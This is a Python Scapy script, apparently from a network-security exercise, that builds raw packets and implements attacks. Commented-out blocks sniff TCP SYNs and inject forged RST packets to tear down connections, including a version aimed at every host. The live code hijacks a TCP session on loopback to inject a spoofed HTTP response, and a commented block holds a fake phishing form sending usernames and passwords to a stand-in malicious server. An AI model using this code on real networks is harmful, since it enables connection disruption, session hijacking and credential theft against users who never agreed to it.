from scapy.all import *
import threading


'''
src_mac = 'a0:51:0b:10:3e:e8'
dst_mac = 'f0:d4:e2:92:d4:94'

#tcp SYN
p = Ether(src='a0:51:0b:10:3e:e8',dst='f0:d4:e2:92:d4:94')/IP(src='10.188.12.243',dst='104.21.5.178')/TCP(dport=80,flags='S')
print(p.show())
sendp(p,iface='Intel(R) Wireless-AC 9560 160MHz')

#DNS request
src_ip = '10.188.12.243'
dst_ip = '8.8.8.8'
dns_query = Ether(src=src_mac, dst=dst_mac)/IP(src=src_ip, dst=dst_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="A"))
print(dns_query.show())
sendp(dns_query, iface='Intel(R) Wireless-AC 9560 160MHz')

#ping
src_ip = '10.188.12.243'
dst_ip = '8.8.8.8'
ping_packet = Ether(src=src_mac, dst=dst_mac)/IP(src=src_ip, dst=dst_ip)/ICMP()
print(ping_packet.show())
sendp(ping_packet,iface='Intel(R) Wireless-AC 9560 160MHz')
'''

'''
#send RST for SYN man
sequece_number=2792958724
sourcePortOfClient=13793
p = Ether(dst='1A0-51-0B-10-3E-E8')/IP(src='82.165.179.197',dst='10.188.12.243')/TCP(sport=4567,ack=1+sequece_number,dport=sourcePortOfClient,flags='RA')
sendp(p, iface='your_wifi_interface')
'''

'''
#send RST for SYN automatic for one person
def reply(p):
    sequece_number = p[TCP].seq
    sourcePortOfClient = p[TCP].sport
    p2 = Ether(dst='a0:51:0b:10:3e:e8')/IP(src='82.165.179.197',dst="192.168.0.1")/TCP(sport=4567,ack=1+sequece_number,dport=sourcePortOfClient,flags='RA')  # build your packet as above, using the seqnum and port found in p
    sendp(p2, iface='Intel(R) Wireless-AC 9560 160MHz')

def Sniff():
    sniff(iface='Intel(R) Wireless-AC 9560 160MHz', filter='(tcp[tcpflags] & tcp-syn) != 0',prn=reply)

Sniff()
'''
'''
#send RST for SYN automatic for all
def reply(p):
    sequece_number = p[TCP].seq
    sourcePortOfClient = p[TCP].sport
    source_ip = p[IP].src
    destination_ip=p[IP].dst
    destination_mac=p[Ether].src
    p2 = Ether(dst=destination_mac)/IP(src=destination_ip,dst=source_ip)/TCP(sport=4567,ack=1+sequece_number,dport=sourcePortOfClient,flags='RA')  # build your packet as above, using the seqnum and port found in p
    sendp(p2, iface='Intel(R) Wireless-AC 9560 160MHz')

def Sniff():
    sniff(iface='Intel(R) Wireless-AC 9560 160MHz', filter='(tcp[tcpflags] & tcp-syn) != 0',prn=reply)

Sniff()


'''
#man in the middle attack:
from scapy.all import *

victim_ip = "127.0.0.1"
target_ip = "127.0.0.1"

#victim_ip = "127.0.0.1"
#target_ip = "10.188.12.243"

state = "WAITING"
recorded_variables = {}

def reply(packet):
    global state, recorded_variables

    if (state == "WAITING" and packet.haslayer(TCP) and packet[TCP].flags == 2):  # TCP SYN
        recorded_variables = {"src_ip": packet[IP].src,"dst_ip": packet[IP].dst,"src_port": packet[TCP].sport,"dst_port": packet[TCP].dport,}
        state = "SYN_RCVD"
        print("Client sent SYN")

    elif state == "SYN_RCVD" and packet.haslayer(TCP) and packet[TCP].flags == 18:  # server->client SYN-ACK
        if (packet[IP].src == recorded_variables["dst_ip"]and packet[IP].dst == recorded_variables["src_ip"]and packet[TCP].sport == recorded_variables["dst_port"]and packet[TCP].dport == recorded_variables["src_port"]):
            state = "SYN_ACK_RCVD"
            print("Client received SYN_ACK from server")

    elif state == "SYN_ACK_RCVD" and packet.haslayer(TCP) and packet[TCP].flags == 16:  # client->server ACK
        if (packet[IP].src == recorded_variables["src_ip"]and packet[IP].dst == recorded_variables["dst_ip"]and packet[TCP].sport == recorded_variables["src_port"]and packet[TCP].dport == recorded_variables["dst_port"]):
            print("Client sent ACK")
            state = "ACK_SENT"

    elif state == "ACK_SENT" and packet.haslayer(TCP) and packet[TCP].flags == 24:  # client->server data packet
        if (packet[IP].src == recorded_variables["src_ip"]and packet[IP].dst == recorded_variables["dst_ip"]and packet[TCP].sport == recorded_variables["src_port"]and packet[TCP].dport == recorded_variables["dst_port"]):
            recorded_variables["seqToUse"] = packet[TCP].ack
            recorded_variables["ack_number"] = packet[TCP].seq + len(packet[TCP].payload)
            state = "QUERY_SENT"
            print("Client sent Query to server")
            print("Sending spoofed packet")
            build_and_send_spoofed_response(packet)
            state = "QUERY_SENT"

    elif (state == "QUERY_SENT"and packet.haslayer(TCP)and packet[TCP].flags == 16):
        if (packet[IP].src == recorded_variables["src_ip"]and packet[IP].dst == recorded_variables["dst_ip"]and packet[TCP].sport == recorded_variables["src_port"]and packet[TCP].dport == recorded_variables["dst_port"]):

            #print("Client received ACK for Query; Sending spoofed Webpage")
            #recorded_variables["seqToUse"] = packet[TCP].ack
            #build_and_send_spoofed_response(packet)
            state = "WAITING"
            recorded_variables = {}

def build_and_send_spoofed_response(packet):
    '''spoofed_response = (Ether(src="f0:d4:e2:92:d4:94", dst=packet[Ether].dst)/IP(src=recorded_variables["dst_ip"], dst=recorded_variables["src_ip"])/TCP(sport=recorded_variables["dst_port"],dport=recorded_variables["src_port"],flags="PA",seq=recorded_variables["seqToUse"])
        / "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"
        / "<html><body><h1>Fake Phishing Page</h1>"
        / "<form action='http://malicious_server.com' method='post'>"
        / "Usernames: <input type='text' name='usernames'><br>"
        / "Passwords: <input type='password' name='passwords'><br>"
        / "<input type='submit' value='Submits'></form></body></html>")'''

    #                  recorded_variables["dst_ip"]  recorded_variables["src_ip"]
    RESP = "HTTP/1.1 200 OK\r\n"
    RESP += "Server: exampleServer\r\n"
    RESP += "Content-Length: 6\r\n"
    RESP += "\r\n"
    RESP += "Hacked"
    spoofed_response = IP(src="127.0.0.1", dst="127.0.0.1")/TCP(sport=23456,dport=recorded_variables["src_port"],flags="PA",seq=recorded_variables["seqToUse"],ack=recorded_variables["ack_number"])/RESP

    send(spoofed_response, iface='Npcap Loopback Adapter')
    spoofed_fin_packet = IP(src="127.0.0.1", dst="127.0.0.1") / TCP(sport=23456,dport=recorded_variables["src_port"],flags="FA")

    # Sending the FIN packet
    send(spoofed_fin_packet, iface='Npcap Loopback Adapter')

'''
    fin_response = (
            IP(src=recorded_variables["dst_ip"], dst=recorded_variables["src_ip"])
            / TCP(
        sport=recorded_variables["dst_port"],
        dport=recorded_variables["src_port"],
        flags="FA",  # FIN-ACK flags
        seq=packet[TCP].ack,
        ack=packet[TCP].seq),
    )
    sendp(fin_response, iface='Intel(R) Wireless-AC 9560 160MHz')
'''

def packet_callback(packet):
    if (IP in packet and TCP in packet):
        if ((packet[IP].src == victim_ip and packet[IP].dst == target_ip) or (packet[IP].src == target_ip and packet[IP].dst == victim_ip)):
            print("Got hit")
            reply(packet)
            #x=threading.Thread(target=reply, args=packet)
            #x.start()

# Set the BPF filter to capture only relevant packets
bpf_filter = f"host {victim_ip} and host {target_ip} and port 23456"
sniff(iface='Npcap Loopback Adapter',prn=packet_callback, filter=bpf_filter, store=0)
